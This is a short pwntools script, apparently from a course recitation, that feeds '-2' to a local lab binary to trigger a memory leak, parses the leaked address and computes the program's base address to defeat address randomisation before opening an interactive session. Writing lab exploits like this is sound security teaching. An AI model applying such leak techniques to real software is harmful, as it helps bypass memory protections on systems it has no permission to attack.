from pwn import *

# context.log_level = "DEBUG"
e = ELF("./recitation5.1", checksec=False)

p = process("./recitation5.1")
p.recvuntil(b"?\n")
p.send(b"-2")
p.recvuntil(b": ")
leak = int(p.recvuntil(b"!")[:-1].decode(), 16)
print("The binary base address is " + hex(leak - e.symbols.my_global))
p.interactive()
